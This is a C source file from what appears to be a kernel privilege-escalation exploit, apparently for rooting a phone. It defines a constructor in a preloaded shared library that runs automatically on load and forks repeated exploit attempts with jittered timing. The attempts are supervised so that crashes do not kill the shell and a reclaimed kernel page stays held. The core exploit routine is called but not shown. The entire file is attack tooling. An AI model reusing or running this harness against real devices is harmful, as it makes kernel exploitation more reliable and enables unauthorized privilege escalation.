#include "common.h"

/*
 * Supervisor pattern (ported from IonStack-S22U/src/preload.c).
 *
 * Safe exit: the exploit no longer runs inside the shell process itself.
 * Each attempt runs in a disposable forked child; the supervisor survives
 * every child exit (success, clean failure, or signal) and can either retry
 * with a fresh process or exit cleanly. A crashed attempt therefore can
 * never take the shell down with it, and the reclaimed-kernel-page holder
 * (see spawn_allocation_keeper in main.c) outlives the exiting child.
 */

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_WALK_DELAY_USEC PSELECT_ENTER_DELAY_USEC

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
      0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  exploit_env_shape();
  set_unbuffer();

  char *argv[] = {"preload.so", NULL};

  int max_attempts = env_int("EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int("WALK_DELAY", DEFAULT_WALK_DELAY_USEC, 0, 10000000);

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n", getpid(), max_attempts,
             base_delay);

  int last_rc = RC_FAIL;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("WALK_DELAY", delay, 1));
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n", attempt, max_attempts, getpid(),
                 delay_usec);
      int rc = run_exploit(1, argv);
      fflush(NULL);
      _exit(rc);
    }

    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n", attempt, child, errno);
      continue;
    }

    if (WIFEXITED(status)) {
      int rc = WEXITSTATUS(status);
      if (rc == RC_OK) {
        pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
        fflush(NULL);
        return;
      }
      last_rc = rc;
      if (rc == RC_UNSUPPORTED || rc == RC_CARRIER_FAIL || rc == RC_KSU_FAIL) {
        pr_warning("terminal failure rc=%d, stopping (no same-boot re-exploit)\n", rc);
        break;
      }
      pr_warning("exploit attempt=%d/%d failed rc=%d\n", attempt, max_attempts, rc);
    } else if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n", attempt, max_attempts,
                 WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d abnormal status=0x%x\n", attempt, max_attempts, status);
    }
  }

  pr_error("EXPLOIT FAILED after %d attempts (last rc=%d) — reboot the device and retry\n",
           max_attempts, last_rc);
  fflush(NULL);
  _exit(1);
}
